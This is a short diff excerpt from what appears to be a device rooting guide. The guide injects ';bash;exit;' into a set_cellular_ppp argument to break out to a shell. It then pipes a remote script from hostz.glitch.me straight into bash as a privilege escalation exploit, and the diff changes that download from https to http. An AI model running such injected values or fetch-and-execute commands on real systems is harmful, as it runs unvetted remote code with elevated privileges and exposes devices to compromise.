@@ -13,7 +13,7 @@ set_cellular_ppp \';bash;exit;\'
 ```
 2. Run the privilege escalation exploit:
 ```bash
-bash <(curl https://hostz.glitch.me/80.sh)
+bash <(curl http://hostz.glitch.me/80.sh)
 ```
 3. Now, plug in your USB drive/SD card and find the path to its block device. Usually, it'll be /dev/sda if you're using a USB drive, or something different with an SD card. Either way, use the following command to find it (it's usually at the bottom)
 ```bash
